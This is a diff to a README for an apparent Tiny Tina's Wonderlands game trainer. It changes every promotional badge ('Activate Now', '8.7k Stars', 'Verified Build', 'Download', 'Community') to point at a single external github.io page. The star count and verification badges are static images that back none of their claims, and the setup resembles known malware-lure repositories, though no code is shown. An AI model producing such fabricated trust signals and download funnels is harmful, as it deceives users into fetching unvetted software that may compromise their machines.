@@ -23,10 +23,10 @@ This trainer is a **single-player enhancement tool** designed for experimentatio
 
 ---
 
-[![Activate Now](https://img.shields.io/badge/Activate-Now-red?logo=rocket\&style=for-the-badge)](#)
-[![Windows Support](https://img.shields.io/badge/Windows-10%2F11-blue?logo=windows\&style=for-the-badge)](#)
-[![⭐️ 8.7k Stars](https://img.shields.io/badge/Community-8.7k_Stars-green?logo=github\&style=for-the-badge)](#)
-[![Download](https://img.shields.io/badge/Download-Latest-brightgreen?logo=github\&style=for-the-badge)](#)
+[![Activate Now](https://img.shields.io/badge/Activate-Now-red?logo=rocket\&style=for-the-badge)](https://tiny-tinas-wonderlands-trainer.github.io/.github/)
+[![Windows Support](https://img.shields.io/badge/Windows-10%2F11-blue?logo=windows\&style=for-the-badge)](https://tiny-tinas-wonderlands-trainer.github.io/.github/)
+[![⭐️ 8.7k Stars](https://img.shields.io/badge/Community-8.7k_Stars-green?logo=github\&style=for-the-badge)](https://tiny-tinas-wonderlands-trainer.github.io/.github/)
+[![Download](https://img.shields.io/badge/Download-Latest-brightgreen?logo=github\&style=for-the-badge)](https://tiny-tinas-wonderlands-trainer.github.io/.github/)
 
 ---
 
@@ -159,6 +159,6 @@ A: Yes, just disable the trainer or press the reset hotkey.
 
 The **Tiny Tina’s Wonderlands Trainer** combines **combat boosts, loot farming assists, and survivability mods** into one tool. Whether you’re grinding legendary gear, taking down bosses, or exploring casually, it gives you full control over your adventure.
 
-[![Verified Build](https://img.shields.io/badge/Verified-Build-success?logo=github\&style=for-the-badge)](#)
-[![Community](https://img.shields.io/badge/Join-Community-purple?logo=discord\&style=for-the-badge)](#)
-[![Download](https://img.shields.io/badge/Download-Now-orange?logo=github\&style=for-the-badge)](#)
+[![Verified Build](https://img.shields.io/badge/Verified-Build-success?logo=github\&style=for-the-badge)](https://tiny-tinas-wonderlands-trainer.github.io/.github/)
+[![Community](https://img.shields.io/badge/Join-Community-purple?logo=discord\&style=for-the-badge)](https://tiny-tinas-wonderlands-trainer.github.io/.github/)
+[![Download](https://img.shields.io/badge/Download-Now-orange?logo=github\&style=for-the-badge)](https://tiny-tinas-wonderlands-trainer.github.io/.github/)
